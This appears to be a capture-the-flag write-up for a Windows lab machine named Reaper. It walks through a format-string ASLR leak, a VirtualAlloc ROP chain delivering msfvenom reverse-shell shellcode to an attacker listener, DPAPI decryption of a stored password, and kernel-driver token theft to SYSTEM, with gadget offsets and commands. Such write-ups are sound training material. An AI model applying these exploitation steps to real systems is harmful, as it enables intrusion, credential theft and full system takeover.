# Reaper

**OS:** Windows | **Difficulty:** Insane | **IP:** '$IP'

## Overview
Reaper is a Windows binary exploitation machine featuring a custom key activation service vulnerable to both format string and buffer overflow attacks. The foothold requires chaining a format string info leak (ASLR bypass) with a stack buffer overflow ROP chain that calls VirtualAlloc to make the stack executable, then executes reverse shell shellcode. Privilege escalation involves decrypting a DPAPI-protected credential, then exploiting a kernel driver with arbitrary read/write to perform token theft for SYSTEM access.

## Enumeration

### Port Scanning

**Command:**
```bash
nmap -sC -sV -p- $IP -oN scans/full_tcp.txt
```

**Key results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | Microsoft ftpd | Anonymous access |
| 80 | HTTP | IIS 10.0 | Default page |
| 3389 | RDP | Terminal Services | Windows 10 Build 19045 |
| 4141 | Custom | ReaperKeyCheck | Menu: Set key / Activate key / Exit |

### Service Enumeration

**FTP (port 21):**
Anonymous login revealed two files:
```bash
ftp $IP
# anonymous login
get dev_keys.txt
get dev_keysvc.exe
```

`dev_keys.txt` contained three development keys in format `XXX-XXXXX-XXX-XXXX-XXXX-<base64>` with a note that activation was broken. `dev_keysvc.exe` was a 64-bit Windows PE binary — the service running on port 4141.

**Port 4141:**
A menu-driven service accepting keys for activation. Interacting with netcat showed options to set a key, activate it, or exit.

### What Stood Out
The custom binary on FTP + a custom service on 4141 strongly hinted at binary exploitation. The PDB path `C:\Users\xct\source\repos\ReaperKeyCheck` confirmed it was a challenge binary. Reverse engineering it revealed two vulnerabilities in the key activation flow.

## Foothold

### The Vulnerability
Two vulnerabilities in `dev_keysvc.exe`:

1. **Format String:** The key string is used as the format argument to `snprintf()` during activation, leaking stack/register values.
2. **Buffer Overflow:** The base64-decoded comment portion of the key is copied via `memcpy()` into a 128-byte stack buffer without bounds checking.

Key format: `XXX-XXXXX-XXX-XXXX-XXXX-<base64_comment>` with a checksum calculated by summing `(char - 0x30)` for each non-dash character at positions 0-17, mod 10000.

### Exploitation — Step by Step

**Step 1: ASLR Bypass via Format String**

The `%p` format specifier at key positions 0-1 leaks the first `snprintf` vararg (r9 register), which contains a pointer to the `"Checking key: "` string at RVA `0x20660`.

```python
key = make_key("%p0-FE9A1-500-A270-", b"AA")
# Response: "Checking key: 00007FF7AD4A06600-FE9A1, Comment: AA"
binary_base = leaked_ptr - 0x20660  # e.g., 0x7FF7AD480000
```

**Step 2: ROP Chain Construction**

With ASLR bypassed and DEP enabled, the ROP chain calls `VirtualAlloc` to make the current stack page RWX, then jumps to shellcode placed on the stack.

Key gadgets (offsets from binary base):
- `pop rbx; ret` @ `0x20d9`
- `xor rbx, rsp; ret` @ `0x1fa0` — gets stack address into rbx
- `push rbx; pop rax; ret` @ `0x1fc2`
- `mov rcx, rax; ret` @ `0x1f80` — rcx = stack addr (VirtualAlloc lpAddress)
- `mov r9, rbx; mov r8, 0; add rsp, 8; ret` @ `0x1f90` — r9 = 0x40 (PAGE_EXECUTE_READWRITE)
- `add r8, r9; add rax, r8; ret` @ `0x3918` — repeated 0x40 times to build r8 = 0x1000
- `pop rax; ret` @ `0x150a` + `mov rax, [rax]; add rsp, 0x28; ret` @ `0x1547f` — dereference IAT for VirtualAlloc address
- `mov rdx, r8; jmp rax` @ `0x5adb` — set rdx and call VirtualAlloc
- `push rsp; and al, 8; ret` @ `0x1becd` — jump to shellcode on now-RWX stack

The chain:
1. Get stack address via `xor rbx, rsp` → rcx
2. Set r9 = 0x40 (PAGE_EXECUTE_READWRITE)
3. Build r8 = 0x1000 via 64 iterations of `add r8, r9`
4. Load VirtualAlloc from IAT into rax
5. `mov rdx, r8; jmp rax` → `VirtualAlloc(stack, 0x1000, 0x1000, 0x40)`
6. `push rsp; ret` → execute shellcode on now-executable stack

**Step 3: Trigger Exploit**

```python
# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4444 EXITFUNC=thread -f raw

# Overflow: 80 bytes padding + 8 bytes saved RDI + ROP chain + NOP sled + shellcode
overflow = b'A'*80 + p64(0x4141414141414141) + rop + b'\x90'*16 + shellcode

# Set key and activate
key = make_key("100-FE9A1-500-A270-", overflow)
```

### Getting a Shell
```bash
# Listener
nc -lvnp 4444

# Exploit sends key with overflow, activates it
# Shell connects back as reaper\keysvc
```

```
C:\keysvc>whoami
reaper\keysvc
```

## User

### Situation
Shell as `keysvc` service account. User flag at `C:\Users\keysvc\Desktop\user.txt`.

### Discovery
```bash
type C:\Users\keysvc\Desktop\user.txt
# '<redacted>'

type C:\Users\keysvc\automation.txt
# DPAPI-encrypted SecureString blob
```

The `automation.txt` file contained a DPAPI-encrypted credential (PowerShell `ConvertTo-SecureString` format).

### Exploitation
Decrypted the DPAPI blob using PowerShell (DPAPI is per-user, so running as keysvc can decrypt it):
```powershell
$ss = Get-Content C:\Users\keysvc\automation.txt | ConvertTo-SecureString
$ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
[System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
# Result: CatWinterMist10
```

Credential `keysvc:CatWinterMist10` enables RDP access for a more stable session.

### Flag
```bash
type C:\Users\keysvc\Desktop\user.txt
```
`<redacted>`

## Privilege Escalation (Root)

### Situation
Access as `keysvc` user. Found `C:\driver\reaper.sys` — a custom kernel driver loaded as a service.

### Discovery
```bash
sc query reaper
# STATE: 4 RUNNING, TYPE: KERNEL_DRIVER

dir C:\driver\
# reaper.sys  8,432 bytes
```

Reverse engineering `reaper.sys` revealed three IOCTLs on device `\\.\Reaper`:
- **0x80002003 (INIT):** Allocates a 32-byte kernel pool buffer, copies user input (requires magic `0x6a55cc9e`). Fields: magic, threadId, priority, pad, src_ptr, dst_ptr.
- **0x8000200b (COPY):** Reads QWORD from `[kernelBuf+0x10]` (src) and writes to `[kernelBuf+0x18]` (dst) — **arbitrary kernel QWORD copy**.
- **0x80002007 (FREE):** Frees the kernel buffer.

### Exploitation
**Token theft:** Copy the System process (PID 4) token to our process's EPROCESS token field.

Windows 10 Build 19045 EPROCESS offsets:
- UniqueProcessId: +0x440
- ActiveProcessLinks: +0x448
- Token: +0x4b8

**Step 1:** Find EPROCESS addresses via `NtQuerySystemInformation(SystemHandleInformation)`. Match our process by PID + handle value. Find System by PID 4 with handle value 4 (self-handle) and matching process object type.

**Step 2:** INIT the driver with `src = SystemEPROCESS + 0x4b8` and `dst = MyEPROCESS + 0x4b8`.

**Step 3:** COPY executes `*dst = *src` — our token becomes the System token.

```c
// Key struct for SystemHandleInformation (24 bytes on x64):
typedef struct {
    USHORT UniqueProcessId;  // +0
    USHORT BackTraceIndex;   // +2
    UCHAR ObjectTypeIndex;   // +4
    UCHAR HandleAttributes;  // +5
    USHORT HandleValue;      // +6
    PVOID Object;            // +8 (EPROCESS pointer)
    ULONG GrantedAccess;     // +16
} HANDLE_ENTRY;              // total: 24 bytes

// NumberOfHandles (ULONG) at offset 0, entries start at offset 8 (with padding)
```

Critical debugging notes:
- The `_pad` field after `NumberOfHandles` is necessary (compiler alignment)
- `ExFreePoolWithTag(NULL)` causes BSOD — skip FREE on first use
- PID 4's handle value 4 specifically points to the System EPROCESS itself

```
C:\keysvc>C:\Users\keysvc\privesc.exe
pid=1500 h=176
handles=27767
me=0xffffc78ab2b712c0 t=7
sys=0xffffc78ab1c5c080(h4)
OK

C:\keysvc>whoami
nt authority\system
```

### Flag
```bash
type C:\Users\Administrator\Desktop\root.txt
```
`<redacted>`

## Key Takeaways
- Format string in Windows `snprintf` works for info leaks (`%p`) and even writes (`%n`), though `%n` crashed the process when writing to read-only memory
- The ROP chain using `xor rbx, rsp` to capture the stack address was elegant — no separate stack leak needed
- Building register values via repeated `add r8, r9` (64 iterations of adding 0x40 = 0x1000) works when direct `pop r8` gadgets don't exist
- `mov rdx, r8; jmp rax` is a hidden gadget that ropper misses (uses `jmp` not `ret`)
- Kernel driver exploitation requires precise struct alignment — a 4-byte offset error causes BSOD
- `ExFreePoolWithTag(NULL)` causes a kernel crash — always check before freeing
- NtQuerySystemInformation class 16 entries start at offset 8 (not 4) due to 8-byte alignment of the first HANDLE_ENTRY's PVOID field

## Commands Quick Reference
```bash
# Recon
nmap -sC -sV -p- $IP
ftp 10.129.8.66  # anonymous → get dev_keysvc.exe, dev_keys.txt

# Foothold (format string leak + ROP overflow)
python3 exploit.py  # leaks base, sends ROP+shellcode

# User (DPAPI decrypt)
powershell -c "$ss = Get-Content automation.txt | ConvertTo-SecureString; ..."
# Password: CatWinterMist10

# Root (kernel driver token theft)
C:\Users\keysvc\privesc.exe  # IOCTL token theft → SYSTEM
```
